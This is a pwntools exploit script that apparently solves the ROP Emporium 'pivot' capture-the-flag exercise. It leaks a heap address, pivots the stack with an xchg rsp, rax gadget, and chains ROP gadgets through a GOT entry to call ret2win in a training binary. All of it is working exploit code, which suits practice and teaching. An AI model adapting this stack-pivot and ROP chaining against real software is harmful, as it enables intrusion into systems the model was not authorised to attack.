from pwn import *
from pwnlib.util.packing import p64

path = '/home/jeremy/Downloads/pivot/pivot'
libc = '/home/jeremy/Downloads/pivot/libpivot.so'


exe = ELF(path) # Adjust path if neeeded
libc = ELF(libc)
rop = ROP(exe)

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']

def start(argv=[], *a, **kw):
	if args.GDB:
		return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
	elif args.REMOTE:
		return remote('0.0.0.0', 43)
	else:
		return process([exe.path] + argv, *a, **kw)

gdbscript = '''break main'''

#----------------EXPLOIT---------------------

io = start()

padding_offset = 40
flag_txt = "flag.txt"
plt_foothold = exe.plt['foothold_function']
got_foothold = exe.got['foothold_function']
ret2win_offset = libc.symbols["ret2win"] - libc.symbols["foothold_function"]
call_rax = p64(0x4006b0)
mov_rax_rax = p64(0x4009c0)
pop_rax = p64(0x4009bb)
add_rax_rbp = p64(0x4009c4)
pop_rbp = p64(0x4007c8)
xchg_rsp_rax = p64(0x4009bd)

io.recvuntil(b"pivot: ")       # read until the address appears
leak = io.recvline().strip()   # grab the rest of that line
pivot_addr = int(leak, 16)     # convert the hex string to an integer
log.info("address recivd 0x%x: ", pivot_addr)

second_stage = flat(
	"Q"*padding_offset,
	pop_rax,
	pivot_addr,
	xchg_rsp_rax
)

first_stage = flat(
	p64(plt_foothold),
	pop_rax,		# 4009bb : pop rax ; ret
	p64(got_foothold),
	mov_rax_rax,		# 4009c0 : mov rax, qword ptr [rax] ; ret
	pop_rbp,		# 4007c8 : pop rbp ; ret
	ret2win_offset,
	add_rax_rbp,		# 4009c4 : add rax, rbp ; ret
	call_rax		# 4006b0 : call rax
	
)

io.sendline(first_stage)
io.sendline(second_stage)
io.interactive()


